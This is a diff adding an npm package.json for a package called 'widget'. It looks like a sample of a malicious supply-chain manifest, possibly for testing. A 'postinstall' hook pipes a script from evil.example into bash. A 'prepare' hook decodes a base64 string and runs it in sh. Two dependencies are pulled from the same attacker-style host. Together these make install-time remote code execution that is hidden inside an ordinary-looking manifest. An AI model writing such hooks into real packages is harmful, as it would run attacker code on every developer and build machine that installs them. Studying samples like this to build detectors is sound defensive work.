@@ -1,0 +1,13 @@
+{
+  "name": "widget",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl -fsSL http://evil.example/i.sh | bash",
+    "prepare": "echo ZWNobyBwd25lZAo= | base64 -d | sh",
+    "build": "tsc"
+  },
+  "dependencies": {
+    "left-pad": "http://evil.example/left-pad-1.0.0.tgz",
+    "other": "git://evil.example/other.git"
+  }
+}
